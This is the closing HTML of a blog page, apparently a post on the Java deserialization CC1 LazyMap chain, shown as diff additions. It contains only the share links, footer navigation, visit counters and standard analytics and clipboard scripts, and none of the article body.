+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jaspersec.top/posts/1914772217.html&title=Java反序列化 CC1-LazyMap链"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jaspersec.top/posts/1914772217.html&is_video=false&description=Java反序列化 CC1-LazyMap链"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java反序列化 CC1-LazyMap链&body=Check out this article: https://jaspersec.top/posts/1914772217.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jaspersec.top/posts/1914772217.html&title=Java反序列化 CC1-LazyMap链"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jaspersec.top/posts/1914772217.html&title=Java反序列化 CC1-LazyMap链"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jaspersec.top/posts/1914772217.html&title=Java反序列化 CC1-LazyMap链"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jaspersec.top/posts/1914772217.html&title=Java反序列化 CC1-LazyMap链"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jaspersec.top/posts/1914772217.html&name=Java反序列化 CC1-LazyMap链&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jaspersec.top/posts/1914772217.html&t=Java反序列化 CC1-LazyMap链"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    Jasper_sec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+      <ul>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">
+          本站总访问量 <span id="busuanzi_value_site_pv"></span>次
+        </span>
+        <span id="busuanzi_container_site_uv">
+          本站访客数 <span id="busuanzi_value_site_uv"></span>人
+        </span>
+        <span id="busuanzi_container_page_uv">
+          本页访问量 <span id="busuanzi_value_page_pv"><!-- number will be auto injected here by busuanzi --></span>次
+        </span>
+      </ul>
+    </nav>
+  </div>
+
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?21e6754c7f372c2de41518ffb4f72c33";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
